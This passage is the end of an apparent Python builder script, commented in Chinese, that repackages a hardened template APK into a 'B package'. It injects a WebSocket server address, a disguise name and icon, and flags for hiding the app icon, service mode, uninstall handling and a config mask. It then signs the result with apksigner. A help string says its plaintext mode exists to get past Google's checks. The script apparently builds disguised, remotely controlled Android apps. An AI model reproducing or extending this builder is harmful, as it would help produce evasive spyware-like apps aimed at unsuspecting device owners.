    
    # apksigner
    cmd = [apksigner, 'sign'] + ks_type_args + [
        '--ks', keystore, '--ks-pass', 'pass:android',
        '--key-pass', 'pass:android', '--ks-key-alias', ks_alias,
        '--min-sdk-version', '21',
        '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
        '--v3-signing-enabled', 'false',
        '--out', output_path, aligned]
    r = subprocess.run(cmd, capture_output=True, text=True, errors='replace')
    
    for tmp in [aligned, aligned + '.idsig', output_path + '.idsig']:
        if os.path.exists(tmp):
            try: os.remove(tmp)
            except: pass
    
    if r.returncode == 0:
        print('    [OK] 签名完成 (apksigner v1+v2)')
    else:
        print(f'    [WARN] 签名失败: {r.stderr[:300]}')
    
    # 最终信息
    final_size = os.path.getsize(output_path) / 1024 / 1024
    print(f'\n  {"="*60}')
    print(f'  SUCCESS: {final_size:.1f} MB -> {output_path}')
    print(f'  {"="*60}\n')


def main():
    parser = argparse.ArgumentParser(description='B包独立构建器 - 从加固版 APK 提取 B包 并注入配置')
    parser.add_argument('--server', required=True, help='WebSocket 服务器地址 (wss://...)')
    parser.add_argument('--web', default='', help='WebView 网页地址')
    parser.add_argument('--name', default='', help='应用显示名称')
    parser.add_argument('--package', default='', help='包名 (留空自动生成)')
    parser.add_argument('--icon', default='', help='应用图标 PNG 路径')
    parser.add_argument('--bg', default='', help='背景图 PNG 路径')
    parser.add_argument('--config', default='', help='完整 pageStyleConfig JSON')
    parser.add_argument('--template', default=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'パルス.apk'),
                       help='加固版模板 APK 路径')
    parser.add_argument('--output', required=True, help='输出 APK 路径')
    parser.add_argument('--plain', action='store_true', default=True, help='明文模式（不加密，用于过谷歌）')
    parser.add_argument('--encrypted', action='store_true', help='强制加密模式（覆盖默认明文）')
    args = parser.parse_args()
    
    # 解析额外配置 (与 build_apk_v2 copy.py 完全一致)
    psc = {}
    if args.config:
        try: psc = json.loads(args.config)
        except: pass
    
    sc_extra = {}
    if psc.get('_configMaskText'): sc_extra['configMaskText'] = psc['_configMaskText']
    if psc.get('_configMaskSubtitle'): sc_extra['configMaskSubtitle'] = psc['_configMaskSubtitle']
    if psc.get('_configMaskTextColor'): sc_extra['configMaskTextColor'] = psc['_configMaskTextColor']
    if psc.get('_configMaskSubtitleColor'): sc_extra['configMaskSubtitleColor'] = psc['_configMaskSubtitleColor']
    
    sc_extra['showAppIcon'] = psc.get('_showAppIcon', 'true') == 'true'
    sc_extra['uninstallMode'] = psc.get('_uninstallMode', 'false') == 'true'
    sc_extra['enableServiceMode'] = psc.get('_enableServiceMode', 'false') == 'true'
    sc_extra['enableConfigMask'] = psc.get('_enableConfigMask', 'true') == 'true'
    
    if psc.get('_ownerUsername'): sc_extra['ownerUsername'] = psc['_ownerUsername']
    
    if psc.get('_loadingTips'):
        try:
            tips = psc['_loadingTips']
            if isinstance(tips, str):
                tips = json.loads(tips) if tips.startswith('[') else tips.split('\n')
            sc_extra['loadingTips'] = tips
        except: pass
    
    psc_out = {}
    for k in ['usageInstructions', 'enableButtonText', 'enableButtonTextColor',
              'buttonColor', 'versionName']:
        if psc.get(k): psc_out[k] = psc[k]
    if psc_out: sc_extra['pageStyleConfig'] = psc_out
    
    pkg = args.package or psc.get('applicationId', '')
    name = args.name or psc.get('appName', '')
    
    build_b_pack(
        template_path=args.template,
        output_path=args.output,
        server_url=args.server,
        web_url=args.web,
        app_name=name,
        package_name=pkg,
        icon_path=args.icon,
        bg_path=args.bg,
        server_config_extra=sc_extra,
        plain_mode=not args.encrypted,
    )


if __name__ == '__main__':
    main()
